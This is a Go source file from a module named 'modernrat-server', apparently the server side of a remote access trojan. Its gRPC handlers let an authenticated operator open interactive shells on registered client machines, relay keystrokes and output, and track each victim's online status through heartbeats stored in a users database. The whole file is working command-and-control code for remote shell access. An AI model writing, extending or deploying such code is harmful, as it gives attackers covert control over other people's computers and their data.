package main

import (
	"context"
	"errors"
	"io"
	"log"
	"time"

	pb "modernrat-server/gen"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
)

func (s *server) AdminShell(stream pb.RemoteShellService_AdminShellServer) error {
	if err := s.authenticate(stream.Context()); err != nil {
		return err
	}

	adminConn := newShellAdminConnection(stream)
	defer adminConn.Close()

	var session *shellSession

	for {
		msg, err := stream.Recv()
		if err != nil {
			if session != nil {
				log.Printf("Admin shell stream ended: session=%s user=%s err=%v", session.id, session.userID, err)
				s.terminateSessionFromAdmin(session, "admin stream closed")
			}

			if errors.Is(err, io.EOF) {
				return nil
			}
			return err
		}

		switch msg.GetType() {
		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_OPEN:
			if session != nil {
				if _, ok := s.shellHub.getSession(session.id); !ok {
					session = nil
				}
			}
			if session != nil {
				_ = adminConn.Send(&pb.ShellMessage{
					Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
					SessionId: session.id,
					UserId:    session.userID,
					Text:      "shell session already active",
				})
				continue
			}

			userID := msg.GetUserId()
			if userID == "" {
				_ = adminConn.Send(&pb.ShellMessage{
					Type: pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
					Text: "user_id is required to open a shell",
				})
				continue
			}

			newSession, err := s.shellHub.startSession(userID, adminConn)
			if err != nil {
				_ = adminConn.Send(&pb.ShellMessage{
					Type:   pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
					UserId: userID,
					Text:   err.Error(),
				})
				continue
			}

			session = newSession

			log.Printf("Admin requested shell: session=%s user=%s", session.id, session.userID)

			// Notify admin about the session identifier.
			_ = adminConn.Send(&pb.ShellMessage{
				Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_OPEN,
				SessionId: session.id,
				UserId:    session.userID,
				Text:      "shell request forwarded to client",
			})

			// Tell the client to start shell.
			openMsg := &pb.ShellMessage{
				Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_OPEN,
				SessionId: session.id,
				UserId:    session.userID,
				Text:      msg.GetText(),
				Cols:      msg.GetCols(),
				Rows:      msg.GetRows(),
			}
			if err := session.clientConn.Send(openMsg); err != nil {
				log.Printf("Failed to forward shell open to user: session=%s user=%s err=%v", session.id, session.userID, err)
				_ = adminConn.Send(&pb.ShellMessage{
					Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
					SessionId: session.id,
					UserId:    session.userID,
					Text:      "failed to reach user agent",
				})
				s.shellHub.endSession(session.id)
				session = nil
				continue
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDIN,
			pb.ShellMessageType_SHELL_MESSAGE_TYPE_RESIZE:
			if session == nil {
				_ = adminConn.Send(&pb.ShellMessage{
					Type: pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
					Text: "no active session",
				})
				continue
			}

			if _, ok := s.shellHub.getSession(session.id); !ok {
				session = nil
				_ = adminConn.Send(&pb.ShellMessage{
					Type: pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
					Text: "no active session",
				})
				continue
			}

			stdinPayload := append([]byte(nil), msg.GetData()...)
			forward := &pb.ShellMessage{
				Type:      msg.GetType(),
				SessionId: session.id,
				UserId:    session.userID,
				Data:      stdinPayload,
				Cols:      msg.GetCols(),
				Rows:      msg.GetRows(),
			}
			if err := session.clientConn.Send(forward); err != nil {
				log.Printf("Failed to forward stdin to user: session=%s user=%s err=%v", session.id, session.userID, err)
				s.terminateSessionFromAdmin(session, "failed to write to client")
				session = nil
				continue
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE:
			if session == nil {
				continue
			}

			s.terminateSessionFromAdmin(session, msg.GetText())
			session = nil

		default:
			_ = adminConn.Send(&pb.ShellMessage{
				Type: pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
				Text: "unsupported message type from admin",
			})
		}
	}
}

func (s *server) ClientShell(stream pb.RemoteShellService_ClientShellServer) error {
	firstMsg, err := stream.Recv()
	if err != nil {
		if errors.Is(err, io.EOF) {
			return nil
		}
		return err
	}

	if firstMsg.GetType() != pb.ShellMessageType_SHELL_MESSAGE_TYPE_REGISTER {
		return status.Error(codes.InvalidArgument, "first message must be REGISTER")
	}

	userID := firstMsg.GetUserId()
	if userID == "" {
		return status.Error(codes.InvalidArgument, "user_id is required")
	}

	clientConn := newShellClientConnection(userID, stream)
	defer clientConn.Close()

	now := time.Now().Unix()
	if _, err := s.db.ExecContext(stream.Context(),
		`UPDATE users SET is_online = 1, last_seen = ? WHERE user_id = ?`,
		now, userID); err != nil {
		log.Printf("Failed to mark user online: user=%s err=%v", userID, err)
	}

	orphaned := s.shellHub.registerClient(clientConn)
	if len(orphaned) > 0 {
		for _, session := range orphaned {
			log.Printf("Closing orphaned session for user=%s session=%s", session.userID, session.id)
			_ = session.adminConn.Send(&pb.ShellMessage{
				Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
				SessionId: session.id,
				UserId:    session.userID,
				Text:      "client reconnected",
			})
		}
	}

	log.Printf("Client registered for shell: user=%s", userID)

	// Acknowledge registration.
	_ = clientConn.Send(&pb.ShellMessage{
		Type:   pb.ShellMessageType_SHELL_MESSAGE_TYPE_REGISTERED,
		UserId: userID,
		Text:   "shell channel ready",
	})

	for {
		msg, err := stream.Recv()
		if err != nil {
			if errors.Is(err, io.EOF) {
				break
			}
			log.Printf("Client shell stream error: user=%s err=%v", userID, err)
			break
		}

		if msg.GetType() == pb.ShellMessageType_SHELL_MESSAGE_TYPE_HEARTBEAT {
			heartbeatTs := msg.GetTs()
			if heartbeatTs == 0 {
				heartbeatTs = time.Now().Unix()
			}
			if _, err := s.db.ExecContext(stream.Context(),
				`UPDATE users SET last_seen = ?, is_online = 1 WHERE user_id = ?`,
				heartbeatTs, userID); err != nil {
				log.Printf("Failed to update heartbeat: user=%s err=%v", userID, err)
			}
			continue
		}

		sessionID := msg.GetSessionId()
		if sessionID == "" {
			log.Printf("Ignoring client shell message without session_id: user=%s type=%v", userID, msg.GetType())
			continue
		}

		session, ok := s.shellHub.getSession(sessionID)
		if !ok {
			log.Printf("Ignoring message for unknown session: user=%s session=%s", userID, sessionID)
			continue
		}

		forward := &pb.ShellMessage{
			Type:      msg.GetType(),
			SessionId: session.id,
			UserId:    session.userID,
			Data:      append([]byte(nil), msg.GetData()...),
			Text:      msg.GetText(),
			ExitCode:  msg.GetExitCode(),
		}

		switch msg.GetType() {
		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_ACCEPTED,
			pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDOUT,
			pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDERR,
			pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR:
			_ = session.adminConn.Send(forward)

			if msg.GetType() == pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR {
				s.shellHub.endSession(session.id)
			}

		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE:
			_ = session.adminConn.Send(forward)
			s.shellHub.endSession(session.id)

		default:
			log.Printf("Unsupported client message type: user=%s type=%v", userID, msg.GetType())
		}
	}

	ended := s.shellHub.unregisterClient(clientConn)
	if len(ended) > 0 {
		for _, session := range ended {
			log.Printf("Ending session due to client disconnect: user=%s session=%s", session.userID, session.id)
			if session.adminConn != nil {
				_ = session.adminConn.Send(&pb.ShellMessage{
					Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_ERROR,
					SessionId: session.id,
					UserId:    session.userID,
					Text:      "client disconnected",
				})
			}
			s.shellHub.endSession(session.id)
		}
	}

	// Use a fresh context; stream.Context() is canceled after the stream ends.
	offCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if _, err := s.db.ExecContext(offCtx,
		`UPDATE users SET is_online = 0, last_seen = ? WHERE user_id = ?`,
		time.Now().Unix(), userID); err != nil {
		log.Printf("Failed to mark user offline: user=%s err=%v", userID, err)
	}

	log.Printf("Client shell stream closed: user=%s", userID)
	return nil
}

func (s *server) terminateSessionFromAdmin(session *shellSession, reason string) {
	if session == nil {
		return
	}

	s.shellHub.endSession(session.id)
	s.broadcastSessionClose(session, reason)
}

func (s *server) broadcastSessionClose(session *shellSession, reason string) {
	if session == nil {
		return
	}

	closeMsg := &pb.ShellMessage{
		Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_CLOSE,
		SessionId: session.id,
		UserId:    session.userID,
		Text:      reason,
	}

	if session.clientConn != nil {
		_ = session.clientConn.Send(closeMsg)
	}
	if session.adminConn != nil {
		_ = session.adminConn.Send(closeMsg)
	}
}
